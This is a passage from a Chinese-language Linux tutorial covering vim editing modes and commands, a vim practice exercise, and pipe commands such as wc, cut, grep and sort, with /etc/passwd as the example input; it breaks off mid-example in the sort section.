<p><img src="/posts/247a4e5f//90d3f3acdaa32af011e62e7be564f47c.png" alt="1574384484673"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>i: 插入光标前一个字符</p>
</li>
<li class="lvl-2">
<p>I: 插入行首</p>
</li>
<li class="lvl-2">
<p>a: 插入光标后一个字符</p>
</li>
<li class="lvl-2">
<p>A: 插入行未</p>
</li>
<li class="lvl-2">
<p>o: 向下新开一行,插入行首</p>
</li>
<li class="lvl-2">
<p>O: 向上新开一行,插入行首</p>
</li>
</ul>
<p>在进入输入模式后， vi 画面的左下角处会出现『–INSERT–』的字样</p>
<h4 id="进入替换模式-Replace-mode">进入替换模式(Replace mode)</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>r : 只会取代光标所在的那一个字符一次</p>
</li>
<li class="lvl-2">
<p>R: 会一直取代光标所在的文字，直到按下ESC为止</p>
</li>
</ul>
<p>在进入输入模式后， vi 画面的左下角处会出现『–REPLACE–』的字样</p>
<h4 id="命令模式常用命令">命令模式常用命令</h4>
<h5 id="移动光标">移动光标</h5>
<table>
<thead>
<tr>
<th>移动光标的方法</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>h 或 向左箭头键(←)</td>
<td>光标向左移动一个字符</td>
</tr>
<tr>
<td>j 或 向下箭头键(↓)</td>
<td>光标向下移动一个字符</td>
</tr>
<tr>
<td>k 或 向上箭头键(↑)</td>
<td>光标向上移动一个字符</td>
</tr>
<tr>
<td>l 或 向右箭头键(→)</td>
<td>光标向右移动一个字符</td>
</tr>
<tr>
<td>向下移动 30 行，可以使用 “30j” 或 “30↓” 的组合按键</td>
<td></td>
</tr>
<tr>
<td>[Ctrl] + [f]</td>
<td>屏幕『向下』移动一页，相当于 [Page Down]按键 (常用)</td>
</tr>
<tr>
<td>[Ctrl] + [b]</td>
<td>屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)</td>
</tr>
<tr>
<td>[Ctrl] + [d]</td>
<td>屏幕『向下』移动半页</td>
</tr>
<tr>
<td>[Ctrl] + [u]</td>
<td>屏幕『向上』移动半页</td>
</tr>
<tr>
<td>+</td>
<td>光标移动到非空格符的下一行</td>
</tr>
<tr>
<td>-</td>
<td>光标移动到非空格符的上一行</td>
</tr>
<tr>
<td>n</td>
<td>表示空格光标向右移动这一行的 n 个字符。例如 20 则光标会向后面移动 20 个字符距离。</td>
</tr>
<tr>
<td>0 或功能键[Home]</td>
<td>这是数字『 0 』：移动到这一行的最前面字符处 (常用)</td>
</tr>
<tr>
<td>$ 或功能键[End]</td>
<td>移动到这一行的最后面字符处(常用)</td>
</tr>
<tr>
<td>H</td>
<td>光标移动到这个屏幕的最上方那一行的第一个字符</td>
</tr>
<tr>
<td>M</td>
<td>光标移动到这个屏幕的中央那一行的第一个字符</td>
</tr>
<tr>
<td>L</td>
<td>光标移动到这个屏幕的最下方那一行的第一个字符</td>
</tr>
<tr>
<td>G</td>
<td>移动到这个文档的最后一行(常用)</td>
</tr>
<tr>
<td>nG</td>
<td>n 为数字。移动到这个文件的第 n 行。例如 20G 则会移动到这个文件的第 20 行(可配合 :set nu)</td>
</tr>
<tr>
<td>gg</td>
<td>移动到这个文档的第一行，相当于 1G</td>
</tr>
<tr>
<td>n</td>
<td>n 为数字。光标向下移动 n 行(常用)</td>
</tr>
</tbody>
</table>
<h5 id="删除操作">删除操作</h5>
<table>
<thead>
<tr>
<th>删除操作</th>
<th>删除后会添加到剪切板，相当于剪切</th>
</tr>
</thead>
<tbody>
<tr>
<td>x, X</td>
<td>x为向后删除一个字符 (相当于 [del] 按键)， X为向前删除一个字符(相当于 [backspace] )</td>
</tr>
<tr>
<td>nx</td>
<td>n 为数字，连续向后删除 n 个字符。例如10x表示连续删除 10 个字符。</td>
</tr>
<tr>
<td>dd</td>
<td>删除光标所在的一整行(常用)</td>
</tr>
<tr>
<td>ndd</td>
<td>n 为数字。删除光标所在的向下 n 行，例如 20dd 则是删除 20 行</td>
</tr>
<tr>
<td>d1G</td>
<td>删除光标所在行到首行的所有数据</td>
</tr>
<tr>
<td>dG</td>
<td>删除光标所在行到最后一行的所有数据</td>
</tr>
<tr>
<td>d$</td>
<td>删除光标所在位置到该行的最后一个字符</td>
</tr>
<tr>
<td>d0</td>
<td>删除光标所在位置到该行的最前面一个字符</td>
</tr>
</tbody>
</table>
<h5 id="撤销-复原-重复">撤销&amp;复原&amp;重复</h5>
<table>
<thead>
<tr>
<th>撤销&amp;复原</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>u</td>
<td>撤销操作，相对于普通编辑器里面的ctrl+z</td>
</tr>
<tr>
<td>Ctrl+r</td>
<td>恢复操作，相对于普通编辑器里面的ctrl+y</td>
</tr>
<tr>
<td>.</td>
<td>就是小数点！可重复前一个动作</td>
</tr>
</tbody>
</table>
<h5 id="复制-粘贴">复制&amp;粘贴</h5>
<table>
<thead>
<tr>
<th>复制&amp;粘贴</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>yy</td>
<td>复制光标所在行</td>
</tr>
<tr>
<td>nyy</td>
<td>n 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行</td>
</tr>
<tr>
<td>y1G</td>
<td>复制光标所在行到第一行的所有数据</td>
</tr>
<tr>
<td>yG</td>
<td>复制光标所在行到最后一行的所有数据</td>
</tr>
<tr>
<td>y0</td>
<td>复制光标所在的那个字符到该行行首的所有数据</td>
</tr>
<tr>
<td>y$</td>
<td>复制光标所在的那个字符到该行行尾的所有数据</td>
</tr>
<tr>
<td>p, P</td>
<td>p 为将已复制的数据在光标下一行贴上，P 则为贴在光标上一行！</td>
</tr>
</tbody>
</table>
<h5 id="合成行">合成行</h5>
<ul class="lvl-0">
<li class="lvl-2">
<p>J: 将光标所在行与下一行的数据结合成同一行</p>
</li>
</ul>
<h5 id="搜索">搜索</h5>
<table>
<thead>
<tr>
<th>搜索</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>/word</td>
<td>向光标之下寻找一个名称为 word 的字符串。</td>
</tr>
<tr>
<td>?word</td>
<td>向光标之上寻找一个字符串名称为 word 的字符串。</td>
</tr>
<tr>
<td>n</td>
<td>代表重复前一个搜寻的动作，根据前面输入的/word还是?word向下或向上搜索下一个匹配的字符串。</td>
</tr>
<tr>
<td>N</td>
<td>表示反向搜索，与n的搜索方向相反。</td>
</tr>
</tbody>
</table>
<h5 id="替换">替换</h5>
<table>
<thead>
<tr>
<th>替换</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>:n1,n2s/word1/word2/g</td>
<td>在第 n1 与 n2 行之间寻找word1并替换为word2！比如『:100,200s/vbird/VBIRD/g』表示在100到200行之间将vbird替换为VBIRD</td>
</tr>
<tr>
<td><code>:1,$s/word1/word2/g</code> 或 <code>:%s/word1/word2/g</code></td>
<td>$表示最后一行，%s表示所有行。</td>
</tr>
<tr>
<td><code>:1,$s/word1/word2/gc</code> 或 <code>:%s/word1/word2/gc</code></td>
<td>gc中的c表示取代前显示提示字符给用户确认 (confirm) ！</td>
</tr>
</tbody>
</table>
<h5 id="底行命令模式的常用操作">底行命令模式的常用操作</h5>
<table>
<thead>
<tr>
<th>底行命令模式</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>:w</td>
<td>保存编辑数据</td>
</tr>
<tr>
<td>:w!</td>
<td>若文件属性为『只读』时，强制写入该文件。不过，到底能不能写入， 还是跟你对该文件的文件权限有关啊！</td>
</tr>
<tr>
<td>:q</td>
<td>离开 vi</td>
</tr>
<tr>
<td>:q!</td>
<td>若曾修改过文件，又不想储存，使用 ! 为强制离开不储存文件。</td>
</tr>
<tr>
<td>惊叹号 (!) 在 vi 当中，常常具有『强制』的意思～</td>
<td></td>
</tr>
<tr>
<td>:wq</td>
<td>储存后离开，若为 :wq! 则为强制储存后离开</td>
</tr>
<tr>
<td>ZZ</td>
<td>若文件没有更动，则不储存离开，若文件已经被更动过，则储存后离开！</td>
</tr>
<tr>
<td>:w [filename]</td>
<td>另存为</td>
</tr>
<tr>
<td>:r [filename]</td>
<td>将另一个文件『filename』的数据加到光标所在行后面</td>
</tr>
<tr>
<td>:n1,n2 w [filename]</td>
<td>将 n1 到 n2 行的内容储存成 filename 这个文件。</td>
</tr>
<tr>
<td>:! command</td>
<td>暂时离开 vi 到指令行模式下执行 command 的显示结果！例如 『:! ls /home』即可在 vi 当中察看 /home 底下以 ls 输出的文件信息！</td>
</tr>
<tr>
<td>:set nu</td>
<td>会在每一行的前缀显示该行的行号</td>
</tr>
<tr>
<td>:set nonu</td>
<td>取消行号显示</td>
</tr>
</tbody>
</table>
<p>示例：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">将当前路径插入到光标的下一行</span><br><span class="line"><span class="symbol">:r!pwd</span></span><br></pre></td></tr></table></figure>
<h4 id="可视模式">可视模式</h4>
<p>v 进入字符可视化模式： 文本选择是以字符为单位的。<br>
V 进入行可视化模式： 文本选择是以行为单位的。<br>
Ctrl+v 进入块可视化模式 ： 选择一个矩形内的文本。</p>
<p>可视模式下可进行如下操作：</p>
<table>
<thead>
<tr>
<th>可视模式操作</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>在选定的部分后面插入内容</td>
</tr>
<tr>
<td>I</td>
<td>在选定的部分前面插入内容</td>
</tr>
<tr>
<td>d</td>
<td>删除选定的部分</td>
</tr>
<tr>
<td>c</td>
<td>删除选定的部分并进入插入模式（有批量替换效果）</td>
</tr>
<tr>
<td>r</td>
<td>把选定的部分全部替换为指定的单个字符</td>
</tr>
<tr>
<td><code>&gt;&gt;</code></td>
<td>向右缩进一个单位，更适合行可视化模式</td>
</tr>
<tr>
<td><code>&lt;&lt;</code></td>
<td>向左缩进一个单位，更适合行可视化模式</td>
</tr>
<tr>
<td><code>gu</code></td>
<td>选中区域转为小写</td>
</tr>
<tr>
<td><code>gU</code></td>
<td>选中区域转为大写</td>
</tr>
<tr>
<td><code>g~</code></td>
<td>大小写互调</td>
</tr>
</tbody>
</table>
<p>可视模式下，选中的区域是由两个端点来界定的（一个在左上角，一个在右下角），在默认情况下只可以控制右下角的端点，而使用<code>o</code>按键则可以在左上角和右下角之间切换控制端点。</p>
<h3 id="VIM快速复习">VIM快速复习</h3>
<h4 id="按-冒号即可进入last-line-mode">按:冒号即可进入last line mode</h4>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:set</span> nu 列出行号</span><br><span class="line"><span class="symbol">:set</span> nonu	取消行号</span><br><span class="line"><span class="symbol">:</span><span class="comment">#7 跳到文件中的第7行</span></span><br><span class="line">/keyword 查找字符  按n向下</span><br><span class="line"><span class="string">?k</span>eyword 查找字符  按N向下</span><br><span class="line"><span class="symbol">:n1</span>,n2/word1/word2/gc  替换指定范围单词，c表示提示</span><br><span class="line"><span class="symbol">:w</span> 保存文件</span><br><span class="line"><span class="symbol">:w</span> filename 以指定的文件名另存</span><br><span class="line"><span class="symbol">:n1</span>,n2 w [filename]	将 n1 到 n2行另存</span><br><span class="line"><span class="symbol">:r</span> [filename]	读入另一个文件加到光标所在行后面</span><br><span class="line"><span class="symbol">:</span>! ls /home  在vi当中察看ls输出信息！</span><br><span class="line"><span class="symbol">:q</span>离开vi</span><br><span class="line"><span class="symbol">:wq</span> 和 <span class="symbol">:ZZ</span> 和 <span class="symbol">:x</span> 保存并退出vi</span><br><span class="line">!强制执行</span><br><span class="line"><span class="symbol">:%</span> s/^<span class="regexp">/#/g</span> 来在全部内容的行首添加 <span class="comment"># 号注释</span></span><br><span class="line"><span class="symbol">:</span><span class="number">1</span>,<span class="number">10</span> s/^<span class="regexp">/#/g</span> 在<span class="number">1</span>~<span class="number">10</span> 行首添加 <span class="comment"># 号注释  </span></span><br></pre></td></tr></table></figure>
<h4 id="从command-mode进入Insert-mode">从command mode进入Insert mode</h4>
<p>按i在当前位置编辑按a在当前位置的下一个字符编辑按o插入新行，从行首开始编辑按R(Replace mode)：R会一直取代光标所在的文字，直到按下 ESC为止；(常用)</p>
<h4 id="按ESC键退回command-mode">按ESC键退回command mode</h4>
<p>h←j↓k↑l→前面加数字移动指定的行数或字符数<br>
1、翻页bu上下整页，ud上下半页</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">ctrl+<span class="selector-tag">b</span>：上移一页。</span><br><span class="line">ctrl+f：下移一页。</span><br><span class="line">ctrl+u：上移半页。</span><br><span class="line">ctrl+d：下移半页。</span><br></pre></td></tr></table></figure>
<p>2、行定位</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">7gg</span>或<span class="number">7</span>G：定位第<span class="number">7</span>行首字符。(可能只在Vim中有效)</span><br><span class="line"><span class="attribute">G</span>：移动到文章的最后。</span><br><span class="line"><span class="attribute">7H</span>:当前屏幕的第<span class="number">7</span>行行首</span><br><span class="line"><span class="attribute">M</span>：当前屏幕中间行的行首</span><br><span class="line"><span class="attribute">7L</span>:当前屏幕的倒数第<span class="number">7</span>行行首</span><br></pre></td></tr></table></figure>
<p>3、当前行定位</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line"><span class="variable">$：</span>移动到光标所在行的“行尾”。</span><br><span class="line"><span class="number">0</span>或^：移动到光标所在行的“行首”</span><br><span class="line">w：光标跳到下个单词的开头</span><br><span class="line">e：光标跳到下个单词的字尾</span><br><span class="line">b：光标回到上个单词的开头</span><br></pre></td></tr></table></figure>
<p>4、编辑</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">x：剪切当前字符</span><br><span class="line">7x：剪切从当前位置起7个字符</span><br><span class="line">大写的X，表示从前面一个字符开始往前计算</span><br><span class="line"><span class="built_in">dd</span>：剪切光标所在行。</span><br><span class="line">7dd：从光标所在行开始剪切7行</span><br><span class="line">d7G	删除光标所在到第7行的所有数据</span><br><span class="line">yw：复制当前单词</span><br><span class="line">7yw：复制从当前位置起7个单词</span><br><span class="line">yy：复制当前行</span><br><span class="line">6yy：从当前行起向下复制6行</span><br><span class="line">y7G	复制游标所在列到第7列的所有数据</span><br><span class="line">p：粘贴</span><br><span class="line">u：撤销</span><br><span class="line">ctrl+r：取消撤销</span><br><span class="line">cw：删除当前单词(从光标位置开始计算)，并进入插入模式</span><br><span class="line">c7w：删除7个单词并进入插入模式</span><br></pre></td></tr></table></figure>
<h4 id="多行编辑，vim支持，vi不支持">多行编辑，vim支持，vi不支持</h4>
<p>按ctrl+V进入块模式，上下键选中快，按大写G选择到末尾，上下左右键移动选择位置按大写I进去编辑模式，输入要插入的字符，编辑完成按ESC退出选中要替换的字符后，按c键全部会删除，然后输入要插入的字符，编辑完成按ESC退出选中要替删除的字符后，按delete键，则会全部删除</p>
<p>按shift+V可进入行模式，对指定行操作</p>
<h3 id="vim练习">vim练习</h3>
<p>1、创建目录/tmp/test，将/etc/man.config复制到该目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mkdir</span> -p /tmp/test</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> /etc/man.config /tmp/test/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> /tmp/test/</span></span><br></pre></td></tr></table></figure>
<p>2、用vim编辑man.config文件：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">vim man.config</span><br></pre></td></tr></table></figure>
<p>3、设置显示行号； 移动到第58行，向右移动40个字符，查看双引号内的是什么目录；</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">：<span class="keyword">set</span> nu</span><br><span class="line">58G 或<span class="comment">58gg</span> </span><br><span class="line">40-&gt; 或40空格 目录为：/dir/bin/foo </span><br></pre></td></tr></table></figure>
<p>4、移动到第一行，并向下查找“bzip2”这个字符串，它在第几行；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">移动到最后一行，并向上查找该字符串；</span><br><span class="line">gg 或1G</span><br><span class="line">/bzip 137行 ?bzip2</span><br></pre></td></tr></table></figure>
<p>5、将50行到100行之间的man更改为MAN，并且 逐个挑选 是否需要修改；</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">若在挑选过程中一直按y，结果会在最后一行出现改变了几个<span class="built_in">man</span>?</span><br><span class="line">:<span class="number">50</span>,<span class="number">100</span>s/<span class="built_in">man</span>/<span class="built_in">MAN</span>/<span class="built_in">gc</span> <span class="number">25</span>次替换</span><br></pre></td></tr></table></figure>
<p>6、修改完后，突然反悔了，要全部复原，有哪些方法？</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">一直按u键	</span><br><span class="line">或者</span><br><span class="line"><span class="symbol">:q!</span>强制不保存退出后，再重新打开该文件</span><br></pre></td></tr></table></figure>
<p>7、复制65到73这9行的内容（含有MANPATH_MAP），并且粘贴到最后一行之后；</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">65gg</span>或<span class="number">65</span>G到该行后，<span class="number">9</span>yy,G 移动到最后一行，p粘贴</span><br></pre></td></tr></table></figure>
<p>8、21行到42行之间开头为#符号的批注数据不要了，如何删除；</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">21G</span>到该行 <span class="number">22</span>dd</span><br></pre></td></tr></table></figure>
<p>9、将这个文件另存为man.test.config的文件</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">:w <span class="keyword">man</span>.<span class="keyword">test</span>.config</span><br></pre></td></tr></table></figure>
<p>10、到第27行，并且删除15个字符，结果出现的第一个字符是什么？</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">27gg</span> 后<span class="number">15</span>x</span><br></pre></td></tr></table></figure>
<p>11、在第一行新增一行，在该行内输入“I am a student ”</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="variable">gg</span>到第一行 <span class="built_in">O</span>输入即可 说明：<span class="variable">o</span>是在当前行之后插入一行，<span class="built_in">O</span>是在当前行之前插入一行</span><br></pre></td></tr></table></figure>
<p>12、保存并退出</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:wq</span></span><br></pre></td></tr></table></figure>
<h2 id="正则表达式（待写）">正则表达式（待写）</h2>
<h2 id="Linux管道命令">Linux管道命令</h2>
<p>Linux的管道命令是’|’，通过它可以对数据进行连续处理，其示意图如下：</p>
<p><img src="/posts/247a4e5f//91c28994d6fb98e8c35f2eac36880df2.jpeg" alt="img"></p>
<p>注意：</p>
<p>1）管道命令仅处理标准输出，对于标准错误输出，将忽略</p>
<p>2）管道命令右边命令，必须能够接收标准输入流命令才行，否则传递过程中数据会抛弃。</p>
<p>常用来作为接收数据管道命令有： less,more,head,tail，而ls, cp, mv就不行。</p>
<h4 id="wc-统计字数">wc - 统计字数</h4>
<p>可以计算文件的Byte数、字数、或是列数，若不指定文件名称、或是所给予的文件名为&quot;-&quot;，则wc指令会从标准输入设备读取数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wc</span> [-lwm] [filename]</span><br><span class="line">-l: 统计行数</span><br><span class="line">-w：统计英文单词</span><br><span class="line">-m：统计字符数</span><br><span class="line">python@xxx:~$ <span class="built_in">wc</span> -l /etc/passwd</span><br><span class="line">49 /etc/passwd</span><br><span class="line">python@xxx:~$ <span class="built_in">wc</span> -w /etc/passwd</span><br><span class="line">81 /etc/passwd</span><br><span class="line">python@xxx:~$ <span class="built_in">wc</span> -m /etc/passwd</span><br><span class="line">2696 /etc/passwd</span><br><span class="line">12345678910</span><br></pre></td></tr></table></figure>
<p>在默认的情况下，wc将计算指定文件的行数、字数，以及字节数。使用的命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">wc</span> testfile           <span class="comment"># testfile文件的统计信息  </span></span><br><span class="line">3 92 598 testfile       <span class="comment"># testfile文件的行数为3、单词数92、字节数598 </span></span><br><span class="line">12</span><br></pre></td></tr></table></figure>
<p>其中，3 个数字分别表示testfile文件的行数、单词数，以及该文件的字节数。</p>
<p>如果想同时统计多个文件的信息，例如同时统计testfile、testfile_1、testfile_2，可使用如下命令：</p>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">$ wc testfile testfile_1 testfile_2  <span class="comment">#统计三个文件的信息  </span></span><br><span class="line">3<span class="number"> 92 </span>598 testfile                    <span class="comment">#第一个文件行数为3、单词数92、字节数598  </span></span><br><span class="line">9<span class="number"> 18 </span>78 testfile_1                   <span class="comment">#第二个文件的行数为9、单词数18、字节数78  </span></span><br><span class="line">3<span class="number"> 6 </span>32 testfile_2                    <span class="comment">#第三个文件的行数为3、单词数6、字节数32  </span></span><br><span class="line">15<span class="number"> 116 </span>708 总用量                    <span class="comment">#三个文件总共的行数为15、单词数116、字节数708 </span></span><br><span class="line">12345</span><br></pre></td></tr></table></figure>
<h4 id="cut-列选取命令">cut - 列选取命令</h4>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">选项与参数：</span><br><span class="line"><span class="deletion">-d  ：后面接分隔字符。与 -f 一起使用；</span></span><br><span class="line"><span class="deletion">-f  ：依据 -d 的分隔字符将一段信息分割成为数段，用 -f 取出第几段的意思；</span></span><br><span class="line"><span class="deletion">-c  ：以字符 (characters) 的单位取出固定字符区间；</span></span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<p>cut以行为单位，根据分隔符把行分成若干列，这样就可以指定选取哪些列了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cut</span> -d <span class="string">&#x27;分隔字符&#x27;</span> -f 选取的列数</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2  	--选取第2列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3,5  	--选取第3列和第5列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-5  	--选取第3列到第5列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 3-   	--选取第3列到最后1列</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span>|<span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1-3,5	--选取第1到第3列还有第5列</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>
<p>只显示/etc/passwd的用户和shell：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta">#cat /etc/passwd | cut -d <span class="string">&#x27;:&#x27;</span> -f 1,7 </span></span><br><span class="line"><span class="symbol">root:</span><span class="keyword">/bin/</span>bash</span><br><span class="line"><span class="symbol">daemon:</span><span class="keyword">/bin/</span>sh</span><br><span class="line"><span class="symbol">bin:</span><span class="keyword">/bin/</span>sh</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>
<h4 id="grep-行选取命令">grep - 行选取命令</h4>
<p>grep一般格式为：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grep</span> [-cinv] <span class="string">&#x27;查找的字符串&#x27;</span> filename</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>在grep命令中输入字符串参数时，最好引号或双引号括起来。例如：<code>grep 'a' 1.txt</code>。</p>
<p>常用选项说明：</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>-v</td>
<td>显示不包含匹配文本的所有行（相当于求反）</td>
</tr>
<tr>
<td>-n</td>
<td>显示匹配行及行号</td>
</tr>
<tr>
<td>-i</td>
<td>忽略大小写</td>
</tr>
<tr>
<td>-c</td>
<td>计算找到的行数</td>
</tr>
</tbody>
</table>
<p>grep搜索内容串可以是正则表达式，常用正则表达式：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>^a</td>
<td>行首,搜寻以 m 开头的行；grep -n ‘^a’ 1.txt</td>
</tr>
<tr>
<td>ke$</td>
<td>行尾,搜寻以 ke 结束的行；grep -n ‘ke$’ 1.txt</td>
</tr>
<tr>
<td>[Ss]igna[Ll]</td>
<td>匹配 [] 里中一系列字符中的一个；搜寻匹配单词signal、signaL、Signal、SignaL的行；grep -n ‘[Ss]igna[Ll]’ 1.txt</td>
</tr>
<tr>
<td>.</td>
<td>.匹配一个非换行符的字符；grep -n ‘e.e’ 1.txt可以匹配 eee，eae，eve，但是不匹配 ee，eaae；</td>
</tr>
<tr>
<td>*</td>
<td>匹配零个或多个先前字符</td>
</tr>
<tr>
<td>[^]</td>
<td>匹配一个不在指定范围内的字符</td>
</tr>
<tr>
<td><code>\(..\)</code></td>
<td>标记匹配字符</td>
</tr>
<tr>
<td>\</td>
<td>锚定单词的开始</td>
</tr>
<tr>
<td><code>\&lt;</code></td>
<td>锚定单词的开头</td>
</tr>
<tr>
<td><code>\&gt;</code></td>
<td>锚定单词的结束</td>
</tr>
<tr>
<td><code>x\&#123;m\&#125;</code></td>
<td>重复字符x，m次</td>
</tr>
<tr>
<td><code>x\&#123;m,\&#125;</code></td>
<td>重复字符x,至少m次</td>
</tr>
<tr>
<td><code>x\&#123;m,n\&#125;</code></td>
<td>重复字符x，至少m次，不多于n次</td>
</tr>
<tr>
<td>\w</td>
<td>匹配文字和数字字符，也就是[A-Za-z0-9]</td>
</tr>
<tr>
<td>\b</td>
<td>单词锁定符</td>
</tr>
</tbody>
</table>
<p>实例：显示所有以“h”结尾的行<br>
grep h$<br>
匹配所有以“a”开头且以“e”结尾的，中间包含2个字符的单词<br>
grep ‘&lt;a…e&gt;’<br>
显示所有包含一个”y”或”h”字符的行<br>
grep [yh]<br>
显示不包含字母a~k 且后紧跟“pple”的单词</p>
<figure class="highlight cos"><table><tr><td class="code"><pre><span class="line">grep [<span class="symbol">^a</span>-<span class="keyword">k</span>]pple</span><br></pre></td></tr></table></figure>
<p>从系统词典中选择所有以“c”开头且以“o”结尾的单词<code>grep '\&lt;c.*o\&gt;'</code><br>
找出一个文件中或者输出中找到包含<code>*</code>的行<code>grep '\*'</code><br>
显示所有包含每个字符串至少有20个连续字母的单词的行<br>
<code>grep [a-Z]\&#123;20,\&#125;</code></p>
<h4 id="sort-排序">sort - 排序</h4>
<p><strong>语法：</strong></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sort</span> [-fbMnrtuk] [<span class="built_in">file</span> <span class="keyword">or</span> <span class="keyword">stdin</span>]</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><strong>参数说明</strong>：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-f ：忽略大小写的差异，例如 A 与 a 视为编码相同；</p>
</li>
<li class="lvl-2">
<p>-b ：忽略最前面的空格符部分；</p>
</li>
<li class="lvl-2">
<p>-M ：以月份的名字来排序，例如 JAN, DEC 等等的排序方法；</p>
</li>
<li class="lvl-2">
<p>-n ：使用『纯数字』进行排序(默认是以文字型态来排序的)；</p>
</li>
<li class="lvl-2">
<p>-r ：反向排序；</p>
</li>
<li class="lvl-2">
<p>-u ：就是 uniq ，相同的数据中，仅出现一行代表；</p>
</li>
<li class="lvl-2">
<p>-t ：分隔符，默认是用 [tab] 键来分隔；</p>
</li>
<li class="lvl-2">
<p>-k ：以哪个区间 (field) 来进行排序</p>
</li>
</ul>
<p>默认是以第一个字符升序排序:</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /etc/passwd | sort </span></span><br><span class="line"><span class="symbol">adm:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">4</span><span class="symbol">:adm</span><span class="symbol">:/var/adm</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line">avahi-<span class="symbol">autoipd:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">156</span><span class="symbol">:avahi-autoipd</span><span class="symbol">:/var/lib/avahi-autoipd</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">avahi:</span><span class="symbol">x:</span><span class="number">70</span><span class="symbol">:</span><span class="number">70</span><span class="symbol">:Avahi</span> <span class="symbol">daemon:</span>/<span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line">......</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>以第3列排序：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@www</span> ~]<span class="comment"># cat /etc/passwd | sort -t &#x27;:&#x27; -k 3</span></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">14</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/sbin/nologin</span></span><br><span class="line"><span class="symbol">operator:</span><span class="symbol">x:</span><span class="number">11</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:operator</span><span class="symbol">:/root</span><span 